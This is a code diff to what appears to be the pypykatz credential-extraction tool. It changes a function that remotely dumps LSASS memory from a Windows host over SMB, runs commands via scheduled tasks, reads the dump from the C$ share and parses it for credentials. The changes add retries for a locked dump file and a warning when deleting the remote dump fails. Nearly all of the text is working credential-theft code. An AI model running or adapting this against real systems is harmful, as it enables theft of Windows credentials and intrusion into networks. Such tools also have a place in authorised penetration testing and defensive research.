@@ -31,6 +31,8 @@ async def lsassfile(url):
 		return mimi
 
 async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\Temp\\', remote_share_name = '\\c$\\Windows\\Temp\\',):
+	from aiosmb.commons.exceptions import SMBException
+	from aiosmb.wintypes.ntstatus import NTStatus
 	from aiosmb.commons.connection.url import SMBConnectionURL
 	from aiosmb.commons.interfaces.machine import SMBMachine
 	from pypykatz.alsadecryptor.asbmfile import SMBFileReader
@@ -67,6 +69,7 @@ async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\T
 		async with SMBMachine(connection) as machine:
 			if method == 'taskexec':
 				logging.debug('[LSASSDUMP] Start dumping LSASS with taskexec method!')
+				logging.info('[LSASSDUMP] File location: %s' % filepath)
 				_, err = await machine.tasks_execute_commands(commands)
 				if err is not None:
 					raise err
@@ -78,9 +81,18 @@ async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\T
 				raise Exception('Unknown execution method %s' % method)
 		
 		logging.debug('[LSASSDUMP] Opening LSASS dump file...')
-		smbfile = SMBFileReader(SMBFile.from_remotepath(connection, filesharepath))
-		_, err = await smbfile.open(connection)
-		if err is not None:
+		for _ in range(3):
+			smbfile = SMBFileReader(SMBFile.from_remotepath(connection, filesharepath))
+			_, err = await smbfile.open(connection)
+			if err is not None:
+				if isinstance(err, SMBException):
+					if err.ntstatus == NTStatus.SHARING_VIOLATION:
+						logging.debug('[LSASSDUMP] LSASS dump is not yet ready, retrying...')
+						await asyncio.sleep(1)
+						continue
+				raise err
+			break
+		else:
 			raise err
 		
 		logging.debug('[LSASSDUMP] LSASS dump file opened!')
@@ -91,8 +103,8 @@ async def lsassdump(url, method = 'taskexec', remote_base_path = 'C:\\Windows\\T
 		logging.debug('[LSASSDUMP] Deleting remote dump file...')
 		_, err = await smbfile.delete()
 		if err is not None:
-			raise err
-		logging.debug('[LSASSDUMP] remote LSASS file deleted OK!')
-
-
+			logging.info('[LSASSDUMP] Failed to delete LSASS file! Reason: %s' % err)
+		else:
+			logging.debug('[LSASSDUMP] remote LSASS file deleted OK!')
+	
 	return mimi
